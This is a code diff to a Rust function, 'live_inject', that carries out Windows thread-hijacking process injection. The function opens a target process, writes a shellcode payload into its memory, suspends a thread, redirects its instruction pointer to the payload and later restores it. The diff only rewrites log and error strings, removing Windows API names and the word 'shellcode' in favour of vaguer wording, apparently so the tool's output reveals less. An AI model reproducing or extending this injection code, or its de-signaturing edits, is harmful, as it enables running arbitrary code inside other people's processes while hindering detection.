@@ -37,15 +37,12 @@ pub fn live_inject(
     const RIP_OFFSET: usize = 0xF8; // offsetof(CONTEXT, Rip)
     const CONTEXT_FLAGS_OFFSET: usize = 0x30;
 
-    log.step(format!(
-        "[1/7] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
-        pid
-    ));
+    log.step(format!("[1/7] Open target (PID {})", pid));
     let process_access =
         PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
     let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
     if process.is_null() {
-        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
+        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
     }
 
     let wrapped = wrap_for_hijack(shellcode);
@@ -53,13 +50,13 @@ pub fn live_inject(
     let flag_offset = size - 1;
     let base = write_remote_payload(process, &wrapped, 7, log)?;
 
-    log.step("[5/7] SuspendThread — finding and suspending a target thread");
+    log.step("[5/7] Finding and suspending a target thread");
 
     let snapshot = unsafe { resolve::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
     let invalid_handle = -1isize as *mut std::ffi::c_void;
     if snapshot.is_null() || snapshot == invalid_handle {
         free_remote(process, base, log);
-        return Err("CreateToolhelp32Snapshot failed".to_string());
+        return Err("thread snapshot failed".to_string());
     }
 
     let mut entry: THREADENTRY32 = unsafe { std::mem::zeroed() };
@@ -93,7 +90,7 @@ pub fn live_inject(
     if thread.is_null() {
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(process) };
-        return Err(format!("OpenThread(TID {}) failed", tid));
+        return Err(format!("thread open (TID {}) failed", tid));
     }
 
     let suspend_result = unsafe { resolve::SuspendThread(thread) };
@@ -101,11 +98,11 @@ pub fn live_inject(
         unsafe { resolve::CloseHandle(thread) };
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(process) };
-        return Err(format!("SuspendThread(TID {}) failed", tid));
+        return Err(format!("thread suspend (TID {}) failed", tid));
     }
     log.info(format!("      suspended thread TID {}", tid));
 
-    log.step("[6/7] SetThreadContext — redirecting RIP to shellcode");
+    log.step("[6/7] Redirecting RIP via context modification");
 
     let mut context_buf = vec![0u8; CONTEXT_SIZE];
     let context_ptr = context_buf.as_mut_ptr() as *mut std::ffi::c_void;
@@ -120,7 +117,7 @@ pub fn live_inject(
         unsafe { resolve::CloseHandle(thread) };
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(process) };
-        return Err("GetThreadContext failed".to_string());
+        return Err("thread context read failed".to_string());
     }
 
     let original_rip = unsafe { *(context_buf.as_ptr().add(RIP_OFFSET) as *const u64) };
@@ -137,12 +134,12 @@ pub fn live_inject(
         unsafe { resolve::CloseHandle(thread) };
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(process) };
-        return Err("SetThreadContext failed".to_string());
+        return Err("thread context update failed".to_string());
     }
-    log.info(format!("      RIP redirected to shellcode at {:#p}", base));
+    log.info(format!("      RIP redirected to {:#p}", base));
 
     unsafe { resolve::ResumeThread(thread) };
-    log.info("      thread resumed — shellcode executing");
+    log.info("      thread resumed — executing");
 
     log.step("[7/7] WaitForCompletion — polling flag + restoring original context");
 
@@ -169,7 +166,7 @@ pub fn live_inject(
             break;
         }
         if std::time::Instant::now() > deadline {
-            log.warning("      timeout waiting for shellcode completion (5s)");
+            log.warning("      timeout waiting for completion (5s)");
             break;
         }
         std::thread::sleep(std::time::Duration::from_millis(50));
@@ -178,7 +175,7 @@ pub fn live_inject(
     unsafe { resolve::SuspendThread(thread) };
     let restore_ptr = saved_context.as_ptr() as *const std::ffi::c_void;
     if unsafe { resolve::SetThreadContext(thread, restore_ptr) } == 0 {
-        log.warning("      SetThreadContext (restore) failed".to_string());
+        log.warning("      context restore failed".to_string());
     } else {
         log.info(format!(
             "      original context restored (RIP: 0x{:X})",
@@ -190,13 +187,13 @@ pub fn live_inject(
     unsafe { resolve::CloseHandle(process) };
 
     if completed {
-        log.info("      shellcode completed, thread continues normally");
+        log.info("      completed, thread continues normally");
     } else {
-        log.warning("      shellcode may not have completed — context restored anyway");
+        log.warning("      may not have completed — context restored anyway");
     }
 
     log.info(format!(
-        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+83)",
+        "      payload at {:#p} ({} bytes, wrapped {}+83)",
         base,
         size,
         size - 83
@@ -213,5 +210,5 @@ pub fn live_inject(
     _shellcode: &[u8],
     _log: &LogSink,
 ) -> Result<InjectionResult, String> {
-    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
+    Err("requires Windows".to_string())
 }
